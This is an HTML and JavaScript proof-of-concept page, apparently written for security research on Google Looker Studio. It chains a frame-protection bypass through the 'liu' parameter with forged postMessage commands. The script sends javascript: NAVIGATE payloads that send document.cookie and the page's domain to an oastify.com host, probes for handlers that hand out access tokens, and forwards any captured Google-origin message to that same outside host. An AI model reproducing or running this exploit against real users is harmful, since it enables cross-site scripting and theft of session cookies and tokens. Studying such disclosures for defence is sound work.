<!DOCTYPE html>
<html>

<head>
    <title>Looker Studio - PoC</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #1a1a2e;
            color: #e0e0e0;
            padding: 20px;
        }

        h1 {
            color: #e94560;
        }

        h2 {
            color: #0f3460;
            background: #e94560;
            padding: 8px;
            border-radius: 4px;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
        }

        .log {
            background: #16213e;
            border: 1px solid #0f3460;
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            max-height: 400px;
            overflow-y: auto;
        }

        .success {
            color: #4ecca3;
        }

        .error {
            color: #e94560;
        }

        .info {
            color: #3498db;
        }

        .warn {
            color: #f39c12;
        }

        button {
            background: #e94560;
            color: white;
            border: none;
            padding: 10px 20px;
            margin: 5px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }

        button:hover {
            background: #c0392b;
        }

        button.primary {
            background: #27ae60;
        }

        button.primary:hover {
            background: #219a52;
        }

        #targetFrame {
            width: 100%;
            height: 400px;
            border: 2px solid #e94560;
            border-radius: 4px;
            margin: 10px 0;
        }

        .section {
            background: #16213e;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
        }

        code {
            color: #f39c12;
            background: #0a0a1a;
            padding: 2px 6px;
            border-radius: 3px;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>Looker Studio - Framing + PostMessage Chain PoC</h1>

        <div class="section">
            <h2>Step 1: Frame Bypass via <code>liu</code></h2>
            <p><code>liu</code> removes X-Frame-Options + frame-ancestors AND sets trusted postMessage origin
                (<code>Po</code>) to our domain.</p>
            <button class="primary" onclick="loadAppview()">Load /appview?liu=ATTACKER</button>
            <button onclick="loadReporting()">Load /reporting (with report ID)</button>
            <br>
            <iframe id="targetFrame" src="about:blank"></iframe>
        </div>

        <div class="section">
            <h2>Step 2: Exploit postMessage</h2>
            <p>Format: <code>JSON.stringify({type, payload})</code> as string. Origin check:
                <code>c.origin === Po</code></p>
            <button class="primary" onclick="sendNavigateExact()">NAVIGATE (safe)</button>
            <button onclick="sendNavigateJS()">NAVIGATE javascript:</button>
            <button onclick="sendAccessToken()">REQUEST ACCESS_TOKEN</button>
            <button onclick="sendAllHandlers()">Probe ALL Handlers</button>
        </div>

        <div class="section">
            <h2>Step 3: Token Exfiltration</h2>
            <button class="primary" onclick="sendTokenExfil()">Navigate to JS exfil</button>
            <button onclick="sendDataExfil()">Exfil via NAVIGATE</button>
        </div>

        <div class="section">
            <h2>Activity Log</h2>
            <div id="log" class="log"></div>
            <button onclick="document.getElementById('log').innerHTML=''">Clear</button>
        </div>
    </div>

    <script>
        /*
         * ATTACKER_ORIGIN must match the origin where this HTML is hosted.
         * The Looker Studio postMessage handler checks: c.origin === Po
         * where Po is set from the 'liu' URL parameter on /appview.
         *
         * When hosted on GitHub Pages at pedrojuniorrd.github.io,
         * the origin is https://pedrojuniorrd.github.io
         */
        var ATTACKER_ORIGIN = 'https://pedrojuniorrd.github.io';
        var LOOKER_BASE = 'https://lookerstudio.google.com';
        var OAST = 'https://von8f8m33ivgjizrhzqjhcgqahg84ysn.oastify.com';

        function log(msg, type) {
            type = type || 'info';
            var el = document.getElementById('log');
            var time = new Date().toISOString().split('T')[1].split('.')[0];
            var div = document.createElement('div');
            div.className = type;
            div.innerHTML = '[' + time + '] ' + msg;
            el.appendChild(div);
            el.scrollTop = el.scrollHeight;
        }

        // Listen for ALL messages from the iframe
        window.addEventListener('message', function (e) {
            var dataStr;
            if (typeof e.data === 'string') {
                dataStr = e.data.substring(0, 500);
            } else {
                try { dataStr = JSON.stringify(e.data).substring(0, 500); }
                catch (err) { dataStr = String(e.data); }
            }
            log('RECEIVED from ' + e.origin + ': ' + dataStr, 'success');

            if (e.ports && e.ports.length > 0) {
                log('Got ' + e.ports.length + ' MessagePort(s)!', 'success');
            }

            // If we get data back, also try to exfiltrate it
            if (e.origin.indexOf('google.com') !== -1) {
                log('Google origin message captured! Sending to OAST...', 'error');
                var img = new Image();
                img.src = OAST + '/captured?data=' + encodeURIComponent(dataStr);
            }
        });

        function getFrame() {
            return document.getElementById('targetFrame');
        }

        // === STEP 1: LOAD IFRAME ===
        function loadAppview() {
            var url = LOOKER_BASE + '/u/0/appview?liu=' + ATTACKER_ORIGIN;
            log('Loading: ' + url, 'info');
            getFrame().src = url;
            setTimeout(function () {
                try {
                    getFrame().contentWindow.location.href;
                    log('Same-origin (unexpected)', 'warn');
                } catch (e) {
                    log('Iframe loaded (cross-origin confirmed)', 'success');
                }
            }, 5000);
        }

        function loadReporting() {
            var reportId = prompt('Enter report ID (or leave blank for appview):', '');
            var url;
            if (reportId) {
                url = LOOKER_BASE + '/u/0/reporting/' + reportId + '?liu=' + ATTACKER_ORIGIN;
            } else {
                url = LOOKER_BASE + '/u/0/appview?liu=' + ATTACKER_ORIGIN;
            }
            log('Loading: ' + url, 'info');
            getFrame().src = url;
        }

        // === STEP 2: EXPLOIT postMessage ===

        /*
         * JS Bundle Analysis - Message Handler:
         *
         *   a.window.addEventListener("message", function(c) {
         *       if (c.origin === b.Po && typeof c.data === "string") {
         *           var d = JSON.parse(c.data);
         *           d.type && a.oa.has(d.type) && d.payload &&
         *               typeof d.payload === "object" && a.oa.get(d.type)(d);
         *       }
         *   });
         *
         * Requirements:
         * 1. c.origin === Po (set from liu parameter on /appview)
         * 2. c.data must be a STRING
         * 3. Valid JSON with {type: string, payload: object}
         *
         * NAVIGATE handler:
         *   a.oa.set("NAVIGATE", function(c) {
         *       if (c.payload && c.payload.url) {
         *           _.lg_Dv(a.Xa, c.payload.url, true, false);
         *           a.jc.navigate([c.payload.url], {skipLocationChange: true});
         *       }
         *   });
         */

        function sendMsg(data) {
            var frame = getFrame();
            var str = JSON.stringify(data);
            log('Sending: ' + str.substring(0, 300), 'warn');
            // MUST send as string, not object - the handler checks typeof c.data === "string"
            frame.contentWindow.postMessage(str, '*');
        }

        function sendNavigateExact() {
            sendMsg({
                type: "NAVIGATE",
                payload: { url: "/navigation/reporting" }
            });
        }

        function sendNavigateJS() {
            var payloads = [
                { type: "NAVIGATE", payload: { url: "javascript:void(document.title='XSS_PROOF')" } },
                { type: "NAVIGATE", payload: { url: "javascript:fetch('" + OAST + "/xss?d='+document.domain)" } },
                { type: "NAVIGATE", payload: { url: "//" + OAST.replace('https://', '') + "/steal" } },
                { type: "NAVIGATE", payload: { url: OAST + "/redirect" } }
            ];
            for (var i = 0; i < payloads.length; i++) {
                (function (idx) {
                    setTimeout(function () { sendMsg(payloads[idx]); }, idx * 500);
                })(i);
            }
        }

        function sendAccessToken() {
            var tokenMsgs = [
                { type: "ACCESS_TOKEN", payload: {} },
                { type: "ACCESS_TOKEN", payload: { scope: "all" } },
                { type: "GOOGLE_AUTH_USER_EMAIL", payload: {} },
                { type: "GET_TOKEN", payload: {} },
                { type: "AUTH", payload: { action: "getToken" } }
            ];
            for (var i = 0; i < tokenMsgs.length; i++) {
                (function (idx) {
                    setTimeout(function () { sendMsg(tokenMsgs[idx]); }, idx * 300);
                })(i);
            }
        }

        function sendAllHandlers() {
            var handlers = [
                { type: "NAVIGATE", payload: { url: "/test" } },
                { type: "ACCESS_TOKEN", payload: {} },
                { type: "GOOGLE_AUTH_USER_EMAIL", payload: {} },
                { type: "SET_CONFIG", payload: { debug: true } },
                { type: "RENDER", payload: { html: "<img src=x>" } },
                { type: "ERROR", payload: { message: "test" } },
                { type: "RESIZE", payload: { width: 100, height: 100 } },
                { type: "READY", payload: {} },
                { type: "INIT", payload: {} },
                { type: "UPDATE", payload: {} },
                { type: "DATA", payload: {} },
                { type: "STATE", payload: {} },
                { type: "CLOSE", payload: {} },
                { type: "OPEN", payload: {} },
                { type: "SAVE", payload: {} },
                { type: "EXPORT", payload: {} }
            ];
            for (var i = 0; i < handlers.length; i++) {
                (function (idx) {
                    setTimeout(function () { sendMsg(handlers[idx]); }, idx * 200);
                })(i);
            }
        }

        // === STEP 3: TOKEN EXFILTRATION ===
        function sendTokenExfil() {
            sendMsg({
                type: "NAVIGATE",
                payload: {
                    url: "javascript:void(fetch('" + OAST + "/token?cookie='+encodeURIComponent(document.cookie)+'&domain='+document.domain))"
                }
            });
        }

        function sendDataExfil() {
            sendMsg({
                type: "NAVIGATE",
                payload: {
                    url: OAST + "/exfil?origin=" + encodeURIComponent(location.origin)
                }
            });
        }

        // Init log
        log('PoC ready.', 'success');
        log('Chain: liu removes X-Frame-Options + sets Po to our origin', 'info');
        log('postMessage(JSON.stringify({type,payload})) passes origin check', 'info');
        log('NAVIGATE handler calls Angular router navigation', 'info');
        log('Attacker origin: ' + ATTACKER_ORIGIN, 'info');
        log('OAST: ' + OAST, 'info');
    </script>
</body>

</html>
